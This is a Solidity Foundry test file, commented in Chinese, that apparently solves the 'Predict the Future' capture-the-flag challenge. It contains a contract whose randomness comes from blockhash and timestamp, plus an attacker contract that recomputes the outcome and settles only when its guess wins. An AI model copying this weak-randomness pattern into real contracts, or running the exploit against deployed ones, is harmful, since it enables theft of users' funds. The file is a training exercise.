pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;

        guesser = address(0);
        if (guess == answer) {
            payable(msg.sender).transfer(2 ether);
        }
    }
}

contract PredictTheFutureAttacker {
    PredictTheFutureChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = PredictTheFutureChallenge(challengeAddress);
    }

    function attack() public payable {
        require(msg.value == 1 ether, "Need 1 ETH");
        // 我们选择 0 作为猜测值
        challenge.lockInGuess{value: 1 ether}(0);
    }

    function exploit() public {
        // 计算当前的答案
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;

        // 只有当我们锁定的值(0)等于计算出的答案时才调用 settle
        if (answer == 0) {
            challenge.settle();
        }
    }

    receive() external payable {}
}

contract PredictTheFutureTest is Test {
    PredictTheFutureChallenge public challenge;
    PredictTheFutureAttacker public attacker;
    
    function setUp() public {
        // 确保测试合约有足够的 ETH
        vm.deal(address(this), 10 ether);
        
        // 部署挑战合约
        challenge = new PredictTheFutureChallenge{value: 1 ether}();
        // 部署攻击合约
        attacker = new PredictTheFutureAttacker(address(challenge));
    }

    function testAttack() public {
        // 转些 ETH 给攻击合约
        vm.deal(address(attacker), 2 ether);

        // 锁定猜测
        attacker.attack{value: 1 ether}();

        // 推进到下一个区块
        vm.roll(block.number + 2);
        console.log("before balance",address(attacker).balance/1e18,"ETH");
        bool success = false;
        // 尝试攻击直到成功
        for (uint i = 0; i < 100; i++) {
            // 更新时间戳，使每次尝试都不同
            vm.warp(block.timestamp + 1);
            try attacker.exploit() {
                // 如果成功就退出循环
                if (challenge.isComplete()) {
                    success = true;
                    break;
                }
            } catch {
                // 如果失败就继续尝试
                continue;
            }
        }
        console.log("after balance",address(attacker).balance/1e18,"ETH");
    }

    receive() external payable {}
}
